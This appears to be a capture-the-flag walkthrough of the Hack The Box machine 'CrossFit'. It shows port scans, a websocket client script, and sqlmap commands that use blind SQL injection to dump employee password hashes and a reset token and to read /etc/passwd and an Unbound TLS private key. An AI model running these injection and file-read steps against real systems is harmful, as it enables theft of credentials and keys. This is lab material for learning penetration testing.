$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.232

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8953/tcp open  ub-dns-control

$ nmap -oN nmap-tcp -p 22,80,8953 -Pn -sC -sV -v 10.10.10.232

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)
|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)
|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)
80/tcp   open  http                (PHP 7.4.12)
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Connection: close
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Sat, 17 Apr 2021 06:38:35 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge">
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|_    <link rel="styleshe
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: OpenBSD httpd
|_http-title: CrossFit
8953/tcp open  ssl/ub-dns-control?
| ssl-cert: Subject: commonName=unbound
| Issuer: commonName=unbound
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-11T07:01:10
| Not valid after:  2040-09-28T07:01:10
| MD5:   efdc 4f2c 5d7e 63c0 3995 4c27 c285 9985
|_SHA-1: 1c66 9cc5 8b72 5c95 d730 0862 4d86 84d7 8a09 1d9b

$ sudo nmap -oN nmap-udp -sU -Pn -v 10.10.10.232

PORT     STATE         SERVICE
4500/udp open|filtered nat-t-ike

---

$ curl --silent http://10.10.10.232 | grep -E "<a.*href" | sed -E 's/.*href=(".*").*/\1/g' | cut -d'"' -f2 | grep -v "#"
./index.php
./index.php
./about-us.php
./classes.php
./blog.php
./contact.php
http://employees.crossfit.htb
https://colorlib.com

$ cat /etc/hosts | grep 10.10.10.232
10.10.10.232	employees.crossfit.htb crossfit.htb

$ curl --silent http://employees.crossfit.htb | grep -E "<a.*href" | sed -E 's/.*href=(".*").*/\1/g' | cut -d'"' -f2 | grep -v "#"

/password-reset.php

$ gobuster dir -b 403,404 -o 80_gobuster.txt -u http://10.10.10.232 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

/images               (Status: 301) [Size: 510] [--> http://10.10.10.232/images/]
/index.php            (Status: 200) [Size: 19041]
/contact.php          (Status: 200) [Size: 8007]
/img                  (Status: 301) [Size: 510] [--> http://10.10.10.232/img/]
/blog.php             (Status: 200) [Size: 15369]
/css                  (Status: 301) [Size: 510] [--> http://10.10.10.232/css/]
[ERROR] 2021/04/17 22:31:22 [!] Get "http://10.10.10.232/ws": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/js                   (Status: 301) [Size: 510] [--> http://10.10.10.232/js/]
/about-us.php         (Status: 200) [Size: 15733]
/classes.php          (Status: 200) [Size: 25946]
/vendor               (Status: 301) [Size: 510] [--> http://10.10.10.232/vendor/]
/elements.php         (Status: 200) [Size: 19654]
/fonts                (Status: 301) [Size: 510] [--> http://10.10.10.232/fonts/]

Pages that don't exist seem to respond with `403` (Forbidden) bu the interesting part here is that the request to `/ws` seems to have timed out so maybe websockets are active.

---

----
> help
{
    "status": "200",
    "message": "Available commands:<br>- coaches<br>- classes<br>- memberships",
    "token": "2a37c28b1a3d146ff0717aa55c49e3ea030c2aa366125824e781ae0ea29b0a94"
}
============
> coaches
{
    "status": "200",
    "message": "Meet our amazing coaches!<br><br><img height=40 src='/img/team/member-1.jpg' class='thumbnail'></img> Will Smith<br><code>2017 World CrossFit Champion</code><br><br><img height=40 src='/img/team/member-2.jpg' class='thumbnail'></img> Maria Williams<br><code>2018 Fitness Guru of the year</code><br><br><img height=40 src='/img/team/member-3.jpg' class='thumbnail'></img> Jack Parker<br><code>2019 IronMan Champion</code><br><br>",
    "token": "04a7fe492a5ce67c3096ebad39a6469c5ed757bd22ff907fed676bd15e332b65"
}
============
> classes
{
    "status": "200",
    "message": "Come see us and try one of our available classes for free! Our selection of amazing activities includes:<br><br>- CrossFit (Level 1 and 2)<br>- Fitness (Body and Mind)<br>- Climbing (Bouldering and Free)<br>- Cardio (Marathon training)<br>- Stretching (Isometric)<br>- Weight Lifting (Body Building, Power Lifting)<br>- Yoga (Power, Hatha, Kundalini)<br>- Nutrition (Customized meal plans)<br>- TRX (Suspension training)<br>",
    "token": "0f05dc0aa937278d806694a1b32515a7a2a6b7dcd28810834c2ada0743253867"
}
============
> memberships
{
    "status": "200",
    "message": "Check the availability of our membership plans with a simple click!<br><br><b>1-month ($99.99)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(1)>Availability</button><br><br><b>3-months ($129.99)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(2)>Availability</button><br><br><b>6-months ($189.99 <del>$209.99</del>)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(3)>Availability</button><br><br><b>1-year ($859.99 <del>$899.99</del>)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(4)>Availability</button><br><br>",
    "token": "3db7700181ed39f532e99eef71006ec205b192ce32af9f09e03077bb500d7cb0"
}
----

----
Meet our amazing coaches!<br><br>

<img height=40 src='/img/team/member-1.jpg' class='thumbnail'></img>
Will Smith<br>
<code>2017 World CrossFit Champion</code><br><br>

<img height=40 src='/img/team/member-2.jpg' class='thumbnail'></img>
Maria Williams<br>
<code>2018 Fitness Guru of the year</code><br><br>

<img height=40 src='/img/team/member-3.jpg' class='thumbnail'></img>
Jack Parker<br>
<code>2019 IronMan Champion</code><br><br>
----
----
Come see us and try one of our available classes for free! Our selection of amazing activities includes:<br><br>
- CrossFit (Level 1 and 2)<br>
- Fitness (Body and Mind)<br>
- Climbing (Bouldering and Free)<br>
- Cardio (Marathon training)<br>
- Stretching (Isometric)<br>
- Weight Lifting (Body Building, Power Lifting)<br>
- Yoga (Power, Hatha, Kundalini)<br>
- Nutrition (Customized meal plans)<br>
- TRX (Suspension training)<br>
----
----
Check the availability of our membership plans with a simple click!<br><br>

<b>1-month ($99.99)<b><br>
<button class='btn btn-sm btn-secondary' onclick=check_availability(1)>Availability</button><br><br>

<b>3-months ($129.99)<b><br>
<button class='btn btn-sm btn-secondary' onclick=check_availability(2)>Availability</button><br><br>

<b>6-months ($189.99 <del>$209.99</del>)<b><br>
<button class='btn btn-sm btn-secondary' onclick=check_availability(3)>Availability</button><br><br>

<b>1-year ($859.99 <del>$899.99</del>)<b><br>
<button class='btn btn-sm btn-secondary' onclick=check_availability(4)>Availability</button><br><br>
----

----
$ python3 ws.py
> available
{
    "status": "200",
    "message": "I'm sorry, this membership plan is currently unavailable.",
    "token": "15ac5951afc530e8382ac7604da3520175c644bca00a0e12a51e28387285c720",
    "debug": "[id: undefined]"
}
----
----
$ cat ws.py
import asyncio
import json as j
import websockets as ws

async def request(target, message):
    async with ws.connect(target) as websocket:
        req = await websocket.send("init")
        token = j.loads(await websocket.recv())["token"]

        req_json = j.dumps({
            "message": message,
            "params": "1",
            "token": token
        })
        req = await websocket.send(req_json)

        res = await websocket.recv()
        return j.loads(res)


def main():
    target = "ws://crossfit.htb/ws"
    message = input("> ")
    res = asyncio.get_event_loop().run_until_complete(request(target, message))
    print(j.dumps(res,indent=4))

if __name__ == "__main__": main()
----
----
$ python3 ws.py
> available
{
    "status": "200",
    "message": "Good news! This membership plan is available.",
    "token": "684981e078adb0745c567bad611eb60adc18e1743286aa4988026d7c00e13edf",
    "debug": "[id: 1, name: 1-month]"
}
----
----
$ sqlmap -u http://localhost:6969/?id=1 --batch

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9898=9898

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8664 FROM (SELECT(SLEEP(5)))wrXd)
---

$ sqlmap -u http://localhost:6969/?id=1 --batch --current-user

current user: 'crossfit_user@localhost'

$ sqlmap -u http://localhost:6969/?id=1 --batch --dbs

available databases [3]:
[*] crossfit
[*] employees
[*] information_schema

$ sqlmap -u http://localhost:6969/?id=1 --batch --dump

Database: crossfit
Table: membership_plans
[4 entries]
+----+----------+-----------+------------+---------------+
| id | name     | available | base_price | current_price |
+----+----------+-----------+------------+---------------+
| 1  | 1-month  | 1         | 99.99      | 99.99         |
| 2  | 3-months | 1         | 129.99     | 129.99        |
| 3  | 6-months | 0         | 209.99     | 189.99        |
| 4  | 1-year   | 1         | 899.99     | 859.99        |
+----+----------+-----------+------------+---------------+

$ sqlmap -u http://localhost:6969/?id=1 --batch -D employees --tables

Database: employees
[2 tables]
+----------------+
| employees      |
| password_reset |
+----------------+

$ sqlmap -u http://localhost:6969/?id=1 --batch -D employees -T employees --dump

Database: employees
Table: employees
[4 entries]
+----+-----------------------------+------------------------------------------------------------------+---------------+
| id | email                       | password                                                         | username      |
+----+-----------------------------+------------------------------------------------------------------+---------------+
| 1  | david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |
| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |
| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |
| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |
+----+-----------------------------+------------------------------------------------------------------+---------------+


$ sqlmap -u http://localhost:6969/?id=1 --batch -D employees -T password_reset --dump

Database: employees
Table: password_reset
[0 entries]
+-------+-------+---------+
| email | token | expires |
+-------+-------+---------+
+-------+-------+---------+

$ sqlmap -u http://localhost:6969/?id=1 -D employees -T password_reset -C token --dump --risk 3 --level 5 --fresh-queries

+------------------------------------------------------------------+
| token                                                            |
+------------------------------------------------------------------+
| d7447a3bfe382373f7f24b3aad04a5a0b9fe1d35164177f7077cb3471b410e6a |
+------------------------------------------------------------------+

$ sqlmap -u http://localhost:6969/?id=1 --charset "0123456789abcdef" -D employees -T password_reset -C token --dump --fresh-queries --risk 3 --level 5

$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/etc/passwd

[INFO] fetching file: '/etc/passwd'
[INFO] retrieved: 726F6F743A2A3A303A303A436861726C696520263A2F726F6F743A2F62696E2F6B73680A6461656D6F6E3A2A3A313A313A54686520646576696C2068696D73656C663A2F726F6F743A2F7362696E2F6E6F6C6F67696E0A6F70657261746F723A2A3A323A353A53797374656D20263A2F6F70657261746F723A2F7362696E2F6E6F6C6F67696E0A62696E3A2A3A333A373A42696E617269657320436F6D6D616E647320616E6420536F757263653A2F3A2F7362696E2F6E6F6C6F67696E0A6275696C643A2A3A32313A32313A6261736520616E642078656E6F63617261206275696C643A2F7661722F656D7074793A2F62696E2F6B73680A737368643A2A3A32373A32373A7373686420707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F706F72746D61703A2A3A32383A32383A706F72746D61703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6964656E74643A2A3A32393A32393A6964656E74643A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7273746174643A2A3A33303A33303A7270632E7273746174643A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F727573657273643A2A3A33323A33323A7270632E727573657273643A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F66696E676572643A2A3A33333A33333A66696E676572643A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7831313A2A3A33353A33353A58205365727665723A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F756E77696E643A2A3A34383A34383A556E77696E64204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F737769746368643A2A3A34393A34393A537769746368204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7472616365726F7574653A2A3A35303A35303A7472616365726F757465207072697664726F7020757365723A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F70696E673A2A3A35313A35313A70696E67207072697664726F7020757365723A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F756E626F756E643A2A3A35333A35333A556E626F756E64204461656D6F6E3A2F7661722F756E626F756E643A2F7362696E2F6E6F6C6F67696E0A5F6470623A2A3A35343A35343A64706220707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F706275696C643A2A3A35353A35353A647062206275696C6420757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F7066657463683A2A3A35363A35363A64706220666574636820757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F706B6766657463683A2A3A35373A35373A706B6720666574636820757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F706B67756E7461723A2A3A35383A35383A706B6720756E74617220757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F7370616D643A2A3A36323A36323A5370616D204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A7777773A2A3A36373A36373A48545450205365727665723A2F7661722F7777773A2F7362696E2F6E6F6C6F67696E0A5F6973616B6D70643A2A3A36383A36383A6973616B6D706420707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F72706B692D636C69656E743A2A3A37303A37303A72706B692D636C69656E7420757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F7379736C6F67643A2A3A37333A37333A5379736C6F67204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F70666C6F67643A2A3A37343A37343A70666C6F676420707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F626770643A2A3A37353A37353A424750204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F74637064756D703A2A3A37363A37363A74637064756D7020707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F646863703A2A3A37373A37373A444843502070726F6772616D733A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6D6F70643A2A3A37383A37383A4D4F50204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F74667470643A2A3A37393A37393A54465450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F72626F6F74643A2A3A38303A38303A72626F6F7464204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7070703A2A3A38323A38323A505050207574696C69746965733A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6E74703A2A3A38333A38333A4E5450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6674703A2A3A38343A38343A465450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6F737066643A2A3A38353A38353A4F535046204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F686F73746170643A2A3A38363A38363A486F73744150204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F64766D7270643A2A3A38373A38373A44564D5250204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F726970643A2A3A38383A38383A524950204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F72656C6179643A2A3A38393A38393A52656C6179204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6F73706636643A2A3A39303A39303A4F53504636204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F736E6D70643A2A3A39313A39313A534E4D50204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F79706C6461703A2A3A39333A39333A595020746F204C444150204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7261643A2A3A39343A39343A4950763620526F75746572204164766572746973656D656E74204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F736D7470643A2A3A39353A39353A534D5450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F7277616C6C643A2A3A39363A39363A7270632E7277616C6C643A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6E73643A2A3A39373A39373A4E5344204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6C6470643A2A3A39383A39383A4C4450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F736E64696F3A2A3A39393A39393A736E64696F20707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6C646170643A2A3A3130303A3130303A4C444150204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F696B65643A2A3A3130313A3130313A494B457632204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6973637369643A2A3A3130323A3130323A6953435349204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F736D7470713A2A3A3130333A3130333A534D5450204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F66696C653A2A3A3130343A3130343A66696C6520707269767365703A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F726164697573643A2A3A3130353A3130353A524144495553204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F6569677270643A2A3A3130363A3130363A4549475250204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F766D643A2A3A3130373A3130373A564D204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F746674705F70726F78793A2A3A3130383A3130383A746674702070726F7879206461656D6F6E3A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F6674705F70726F78793A2A3A3130393A3130393A6674702070726F7879206461656D6F6E3A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F736E64696F703A2A3A3131303A3131303A736E64696F2070726976696C6567656420757365723A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F73797370617463683A2A3A3131323A3131323A737973706174636820756E70726976696C6567656420757365723A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A5F736C616163643A2A3A3131353A3131353A534C414143204461656D6F6E3A2F7661722F656D7074793A2F7362696E2F6E6F6C6F67696E0A6E6F626F64793A2A3A33323736373A33323736373A556E70726976696C6567656420757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F6D7973716C3A2A3A3530323A3530323A4D7953514C204163636F756E743A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A6C7563696C6C653A2A3A313030323A313030323A2C2C2C3A2F686F6D652F6C7563696C6C653A2F62696E2F6373680A6E6F64653A2A3A313030333A313030333A3A2F686F6D652F6E6F64653A2F62696E2F6B73680A5F646275733A2A3A3537323A3537323A6462757320757365723A2F6E6F6E6578697374656E743A2F7362696E2F6E6F6C6F67696E0A5F72656469733A2A3A3638363A3638363A7265646973206163636F756E743A2F7661722F72656469733A2F7362696E2F6E6F6C6F67696E0A64617669643A2A3A313030343A313030343A2C2C2C3A2F686F6D652F64617669643A2F62696E2F6373680A6A6F686E3A2A3A313030353A313030353A3A2F686F6D652F6A6F686E3A2F62696E2F6373680A6674703A2A3A313030363A313030363A4654503A2F686F6D652F6674703A2F7362696E2F6E6F6C6F67696E0A

$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/var/unbound/etc/unbound.conf

[INFO] fetching file: '/var/unbound/etc/unbound.conf'
[INFO] retrieved: 7365727665723A0A09696E746572666163653A203132372E302E302E310A09696E746572666163653A203A3A310A096163636573732D636F6E74726F6C3A20302E302E302E302F30207265667573650A096163636573732D636F6E74726F6C3A203132372E302E302E302F3820616C6C6F770A096163636573732D636F6E74726F6C3A203A3A302F30207265667573650A096163636573732D636F6E74726F6C3A203A3A3120616C6C6F770A09686964652D6964656E746974793A207965730A09686964652D76657273696F6E3A207965730A096D73672D63616368652D73697A653A20300A0972727365742D63616368652D73697A653A20300A0963616368652D6D61782D74746C3A20300A0963616368652D6D61782D6E656761746976652D74746C3A2030090A096175746F2D74727573742D616E63686F722D66696C653A20222F7661722F756E626F756E642F64622F726F6F742E6B6579220A0976616C2D6C6F672D6C6576656C3A20320A09616767726573736976652D6E7365633A207965730A09696E636C7564653A20222F7661722F756E626F756E642F6574632F636F6E662E642F6C6F63616C5F7A6F6E65732E636F6E66220A0A72656D6F74652D636F6E74726F6C3A0A09636F6E74726F6C2D656E61626C653A207965730A09636F6E74726F6C2D696E746572666163653A20302E302E302E300A09636F6E74726F6C2D7573652D636572743A207965730A097365727665722D6B65792D66696C653A20222F7661722F756E626F756E642F6574632F746C732F756E626F756E645F7365727665722E6B6579220A097365727665722D63657274266696C653A20222F7661722F756E626F756E642F6574632F746C732F756E626F756E645F7365727665722E70656D220A09636F6E74726F6C2D6B65792D66696C653A20222F7661722F756E626F756E642F6574632F746C732F756E626F756E645F636F6E74726F6C2E6B6579220A09636F6E74726F6C2D636572742D66696C653A20222F7661722F756E626F756E642F6574632F746C732F756E626F756E645F636F6E74726F6C2E70656D220A
----

----
server:
	interface: 127.0.0.1
	interface: ::1
	access-control: 0.0.0.0/0 refuse
	access-control: 127.0.0.0/8 allow
	access-control: ::0/0 refuse
	access-control: ::1 allow
	hide-identity: yes
	hide-version: yes
	msg-cache-size: 0
	rrset-cache-size: 0
	cache-max-ttl: 0
	cache-max-negative-ttl: 0
	auto-trust-anchor-file: "/var/unbound/db/root.key"
	val-log-level: 2
	aggressive-nsec: yes
	include: "/var/unbound/etc/conf.d/local_zones.conf"

remote-control:
	control-enable: yes
	control-interface: 0.0.0.0
	control-use-cert: yes
	server-key-file: "/var/unbound/etc/tls/unbound_server.key"
	server-certfile: "/var/unbound/etc/tls/unbound_server.pem"
	control-key-file: "/var/unbound/etc/tls/unbound_control.key"
	control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
----

----
$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/var/unbound/etc/tls/unbound_control.key

[INFO] fetching file: '/var/unbound/etc/tls/unbound_control.key'
[INFO] retrieved: 2D2D2D2D2D424547494E205253412050524956415445204B45592D2D2D2D2D0A4D4949473541494241414B4341594541316946574E6B7835323249656C396E35436F6332746E4B7A327050633244504D6D634445767963684A4E7841597432650A4A756668314D6A70475376427654374947444E4456747A696F4A3070784B416A4D64672B436479567430356F57742F72356D77426571384E4F554B74685833450A2B313539507962594E5A337057354F5471653355633671357277537077784F455755467369726C566339434A6557595472552B4F52492B5634794E5A574B75530A75492B776F394B6363764466724D4A41514E327130623067582B426F2F504942654D664A746138515A3559356474356F41456979495A696F306B74516E6141660A2F4A673952512B37484453383165392F72523036696C754D52576C515144757869384F35776F6E44394F5146512B7038443234746E42522F61366B614E6654520A734F456C697377377348327470797A586D3148554457664F543374774F44642B3774733253494F725041396D6231586C6F6F7874636731426E77424E4E76636D0A513732395045335A666443764D6175556B674143727637586D315445676848766B79692B52512F776949764773667A634B6C2B4662385854716D4F566B7351480A2B4C37544C4A717775546A786B72656F63556475482F6B324C316B424B48326C566F5331524847724D444368644B3333554F41356671626B76687971514B6D460A44674A7730675438585A53703551494A41674D42414145436767474157663369744B6C4A59556B495948744D4C662B4C6E2F767532494C6941723871557366770A4B41487937514866305730675A5774347671753951305866673442614B636D4A6D487A326864666E554F7159502F2B49657936496757526A65535734683775470A6C352F774A3874394436672B3341486E4531356F365965334A6A534D6A354D54675A555475706C30477A63646E5546677336435761446B5250634D487241504F0A583851556B305173375A5956384A6A362F4B36723736614A36706F73314E59555431647A7672656169417652554968756E6E75336F6B464258314B7A564D4D340A6B65514E7432764E737145304D4431764B70496B36674C4542676C4430323173664B6A6158736F61786C3839544A746E30765A4C4F65373835624779487033720A526579376C5A4F647062476864737A45327358504C762F34674F34374B766C776F39387639426A3150475730625A55566F542B51577A4769466A6F5A704C61500A3633544142374146573756505443626952756772504C73384554715639687658444C49586D3430683977436C7A615356474A447732777266384C694C395A69630A4543694D47423042486A7143307238477566394949507A746474594A4B6F3976716943332F744F6F79536D5866793331477239513046433370306E6D386741360A424A37385456322B4E6D544D707950524D4E4456616D617230753564416F4842415051344B624F6C4669544E4D50492B646E432B72333972364C65546D4D69740A43476E74714537335557373174345356382B456D7273534837384779545754307978316343596C54687A69686E58625A6273334E66334D747A345535454866590A523667505A4E31444F3039636167473861665834615961594E3242326A336B7473627976767851486A5A5A59487144476F4D725A6D4F74714C4E4A39457030740A684338584A4C7234316E42505951504E714A307A6A4935534F5548755A487153754F385373653547443272415175374E486A556B757739644A324C2B654963720A6B346A645A534D2F5A586852514A4D6E33456C61587645674C347165414A396C34774B4277514467645A737958507542386F547453646C575A3857736D5861460A68595A76544F486E7151764776685551786D325169695030466959516C7455724D475456487A5161674C464A6F4A6C6F6C43684F39685966466E4358586552320A62334F6C5250437149704B775763424D3644682F54325732486E3633754F64537075595A636B326A7A614D4C306256624F576256644E3253635A44714B784B4A0A3249484E4C6E6E3462757A71744269544765323438776B4841497A5A426B777258327771642B2B6139677150672F69624B69745957557255552F353537696B490A7961627A337659646E794C4C6C4978776B37626C5374534A6256386A5A57572B794D4D3533434D4367634541675450315841564B346331737837776B445348550A317954507963396356553631314E5457356E415274524A714E4D726761343137694A346953656436367035586C77444B53737A5744532F7A6A70305A386564320A4E676C57634C54763858654B3857367A666876446C516A6654477652347A2B35464777545941565A676C4B615A616A552F6C504170486D614F70546248485A690A594B6D626251436569476B384E57325A45524830345259647A5656516A31706D5569564F42594F4A785138367038444D51624C7646527343546A52576475636E0A7A386B497657624466542B676E68674447644C416242635167736E6A3053727562384D48593936546C634468416F4842414C486B41302F7936564766783048590A5757746C617744547A313861352B536C356851586F63477450447A44526D70625551744E306E55725656365A53424377586A62793734384F76515A7042566B760A4A33455438372F444A6948485372776332792B376E733474453337675049614A676D37483146332F4B54595547434471756957734143434A333157684E4B4C500A7342737A376B6E6F51525547686A6A374D4B6434496B515133376B567635586F35367170415065765367624635592F79356537474F4C4274513061574D5377660A2B48493237325072494A4A61587672414A675A72374D4F7A77326F6C5A377070682F4179776B666E514B2F6E7050486953514B427743735355473075713864680A487A3844317445374764704A4B5053437A624836396B426C7936515A7370376D6361484F5851534970564A734539345051466853484C6D456636336C6A5631500A54716F622B664D6C317A552F31474E634379385A47336B6349614F334C6E4D536762336554524854656A514250333261334A61584243744A30465A516B6C6A470A63745977394B70583233584A6D51676F4C64446A516A5974703567734954774A546C5676366645715846796752666C356B7A667741676E386D347A69384E79420A4231426664614A596B4E7A56424A3975576F785A66633030504A6E45735A526C653774567661432B67424230644A75627931376851413D3D0A2D2D2D2D2D454E44205253412050524956415445204B45592D2D2D2D2D0A
----

----
$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/var/unbound/etc/tls/unbound_control.pem

[INFO] retrieved:
2D2D2D2D2D424547494E2043455254494649434154452D2D2D2D2D0A4D494944714443434168414343514457586F41744B69696F2F44414E42676B71686B69473977304241517346414441534D5241774467594456515144444164310A626D4A766457356B4D423458445449784D4445784D5441334D4445784D316F58445451774D446B794F4441334D4445784D316F77476A45594D425947413155450A4177775064573569623356755A43316A62323530636D39734D4949426F6A414E42676B71686B6947397730424151454641414F43415938414D49494269674B430A41594541316946574E6B7835323249656C396E35436F6332746E4B7A327050633244504D6D634445767963684A4E7841597432654A756668314D6A70475376420A7654374947444E4456747A696F4A3070784B416A4D64672B436479567430356F57742F72356D77426571384E4F554B74685833452B313539507962594E5A33700A57354F5471653355633671357277537077784F455755467369726C566339434A6557595472552B4F52492B5634794E5A574B755375492B776F394B63637644660A724D4A41514E327130623067582B426F2F504942654D664A746138515A3559356474356F41456979495A696F306B74516E6141662F4A673952512B37484453380A3165392F72523036696C754D52576C515144757869384F35776F6E44394F5146512B7038443234746E42522F61366B614E665452734F456C69737737734832740A70797A586D3148554457664F543374774F44642B3774733253494F725041396D6231586C6F6F7874636731426E77424E4E76636D513732395045335A666443760A4D6175556B674143727637586D315445676848766B79692B52512F776949764773667A634B6C2B4662385854716D4F566B7351482B4C37544C4A717775546A780A6B72656F63556475482F6B324C316B424B48326C566F5331524847724D444368644B3333554F41356671626B76687971514B6D4644674A7730675438585A53700A3551494A41674D42414145774451594A4B6F5A496876634E4151454C4251414467674742414261366E486943703730354F51723656495977564277726C69306D0A4F53597471714D502F67475A4546734B45334132357A444B786C544F376167644F63395678543276415A6A5957423367565449326443474F5A47716B5A4443420A5837383479572F3551634466724555413274306E4D723164356364634B515832474B74556D5A4D5A6734696348654569684341334839